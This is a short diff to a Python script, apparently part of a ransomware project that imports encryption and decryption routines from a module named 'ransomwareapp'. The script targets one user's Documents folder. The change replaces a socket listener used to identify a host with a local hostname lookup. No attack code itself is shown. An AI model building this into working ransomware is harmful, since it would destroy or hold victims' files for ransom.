@@ -13,17 +13,7 @@ from ransomwareapp import decryptionfile, encryptionfile
 directory_path = '/home/' + 'sharan-rao' + '/Documents/'
 
 Org_file_list=[]
-
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_address = ('0.0.0.0', 8080)
-server_socket.bind(server_address)
-server_socket.listen(1)
-client_socket, client_address = server_socket.accept()
-client_ip = client_address[0]
-client_socket.close()
-server_socket.close()
-
-system_name = socket.gethostbyaddr(client_ip)
+system_name = socket.gethostname()
 
 
 
